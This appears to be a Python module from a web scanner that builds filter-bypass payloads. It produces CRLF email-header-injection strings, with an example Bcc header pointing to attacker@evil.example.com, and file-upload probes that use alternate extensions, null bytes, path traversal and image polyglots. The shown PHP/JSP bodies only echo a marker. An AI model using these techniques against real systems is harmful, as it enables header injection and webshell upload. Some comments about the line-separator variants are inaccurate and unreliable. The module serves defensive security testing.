"""WAF / 入力フィルタ・バイパス用の決定論的ペイロード生成（LLM 非依存・純粋関数）。

ファイルアップロード検査（:mod:`wscan.scanners.file_upload`）とメールヘッダ
インジェクション検査（:mod:`wscan.scanners.mail_header`）が共有する「進化した」
バイパス候補をここに集約する。ネットワーク/ブラウザ非依存の純粋関数なので
単体テストできる（``tests/test_waf_bypass.py``）。

設計方針:
- 各関数は素朴な防御（拡張子ブラックリスト・MIME 判定・単純な CR/LF 除去・
  単段デコード）を**回避して初めて成立する**変種を列挙する。
- 既存の検知判定ロジックは一切変えない。ここは「投入する種を増やす」だけを担い、
  誤検知ゼロ方針（反射 vs 実行の区別など）は各スキャナ側で従来どおり守る。
"""
from __future__ import annotations

from dataclasses import dataclass


# ── メールヘッダ・インジェクション: CRLF バイパス変種 ──────────────────────
# 改行のさまざまな表現。素朴な実装は ``\r\n`` の除去や ``str.replace`` のみで
# 防御しがちで、以下の代替表現でバイパスできることがある。
#   - 生 CR / LF（CR だけ・LF だけ）
#   - パーセントエンコード（%0d/%0a。サーバ側で 1 回デコードされる経路）
#   - 二重エンコード（%250d%250a。多段デコードを通す経路）
#   - Unicode 行区切り（U+2028 / U+2085）。一部フレームワークが改行扱い
#   - UTF-8 オーバーロング風（%E5%98%8A%E5%98%8D）。壊れたデコーダで %0A/%0D 化
_CRLF_VARIANTS: tuple[tuple[str, str], ...] = (
    ("\r\n", "raw CRLF"),
    ("\n", "bare LF"),
    ("\r", "bare CR"),
    ("%0d%0a", "percent-encoded CRLF"),
    ("%0a", "percent-encoded LF"),
    ("%0d", "percent-encoded CR"),
    ("%250d%250a", "double-encoded CRLF"),
    (" ", "unicode line separator (U+2028)"),
    ("%E5%98%8A%E5%98%8D", "overlong UTF-8 CRLF"),
)


def crlf_bypass_variants(local_part: str, injected_header: str) -> list[tuple[str, str]]:
    """改行表現を変えた CRLF インジェクション・ペイロード群を返す。

    ``local_part`` は正当値（例: ``test@example.com``）、``injected_header`` は
    注入したいヘッダ行（例: ``Bcc: attacker@evil.example.com``）。各要素は
    ``(payload, 改行表現の説明)`` のタプル。重複・空入力は除外する。
    """
    if not injected_header:
        return []
    out: list[tuple[str, str]] = []
    seen: set[str] = set()
    for sep, desc in _CRLF_VARIANTS:
        payload = f"{local_part}{sep}{injected_header}"
        if payload in seen:
            continue
        seen.add(payload)
        out.append((payload, desc))
    return out


# ── ファイルアップロード: フィルタ・バイパス・プローブ ────────────────────
@dataclass(frozen=True)
class UploadProbe:
    """アップロード検査で投入する 1 プローブファイル。"""

    filename: str
    content: bytes
    content_type: str
    description: str


# サーバへ送るプローブ本体。サーバが「実行」すると応答へ ``wscan-probe-<ver>``
# / ``wscan-probe-jsp`` が現れる（検知は file_upload._SHELL_ECHO_RE が担当）。
_PHP_SHELL = b"<?php echo 'wscan-probe-' . phpversion(); ?>"
_JSP_SHELL = b'<% out.print("wscan-probe-jsp"); %>'

# 画像マジックバイト（MIME スニッフィング/簡易判定をすり抜けるための prefix）
_GIF_MAGIC = b"GIF89a"
_PNG_MAGIC = b"\x89PNG\r\n\x1a\n"


def upload_bypass_probes() -> list[UploadProbe]:
    """ファイルアップロードのフィルタ回避プローブ群を返す（決定論・重複なし）。

    素朴な拡張子/MIME ブラックリストを次の観点で回避する:
      - 代替実行拡張子（phtml / php5 / pht / phar / asp / aspx / jspx）
      - 大文字小文字混在（``.PHP`` / ``.pHp``）
      - 末尾ドット・末尾空白（``shell.php.`` / ``shell.php%20``）
      - 二重拡張子（``shell.php.jpg``）
      - NULL バイト切り詰め（``shell.php\\x00.jpg`` / URL エンコード版）
      - 画像マジックバイト polyglot（GIF89a / PNG ヘッダ + PHP 本体で MIME 判定回避）
      - Content-Type 偽装（本文はスクリプトでも ``image/jpeg`` で送る）
    """
    php_jpeg = "image/jpeg"
    return [
        # --- 基本（互換のため従来プローブを先頭に） ---
        UploadProbe("wscan_probe.php", _PHP_SHELL, php_jpeg, "PHP file upload"),
        UploadProbe("wscan_probe.php.jpg", _PHP_SHELL, php_jpeg, "double-extension PHP"),
        UploadProbe("wscan_probe.phtml", _PHP_SHELL, php_jpeg, "phtml extension bypass"),
        UploadProbe("wscan_probe.jsp", _JSP_SHELL, php_jpeg, "JSP file upload"),
        UploadProbe("../wscan_probe.php", _PHP_SHELL, php_jpeg, "path traversal in filename"),
        UploadProbe("wscan\x00probe.php", _PHP_SHELL, php_jpeg, "null byte extension bypass"),
        UploadProbe("wscan_probe.php%00.jpg", _PHP_SHELL, php_jpeg, "URL-encoded null byte bypass"),
        # --- 代替実行拡張子（ブラックリスト漏れ狙い） ---
        UploadProbe("wscan_probe.php5", _PHP_SHELL, php_jpeg, "php5 alternate extension"),
        UploadProbe("wscan_probe.pht", _PHP_SHELL, php_jpeg, "pht alternate extension"),
        UploadProbe("wscan_probe.phar", _PHP_SHELL, php_jpeg, "phar alternate extension"),
        UploadProbe("wscan_probe.jspx", _JSP_SHELL, php_jpeg, "jspx alternate extension"),
        # --- 大文字小文字・末尾ドット/空白（正規化漏れ狙い） ---
        UploadProbe("wscan_probe.PHP", _PHP_SHELL, php_jpeg, "uppercase extension bypass"),
        UploadProbe("wscan_probe.pHp", _PHP_SHELL, php_jpeg, "mixed-case extension bypass"),
        UploadProbe("wscan_probe.php.", _PHP_SHELL, php_jpeg, "trailing dot bypass"),
        UploadProbe("wscan_probe.php ", _PHP_SHELL, php_jpeg, "trailing space bypass"),
        # --- 画像マジックバイト polyglot（MIME スニッフィング回避） ---
        UploadProbe(
            "wscan_probe_gif.php",
            _GIF_MAGIC + b"\n" + _PHP_SHELL,
            "image/gif",
            "GIF89a magic-byte polyglot PHP",
        ),
        UploadProbe(
            "wscan_probe_png.phtml",
            _PNG_MAGIC + b"\n" + _PHP_SHELL,
            "image/png",
            "PNG magic-byte polyglot PHP",
        ),
    ]
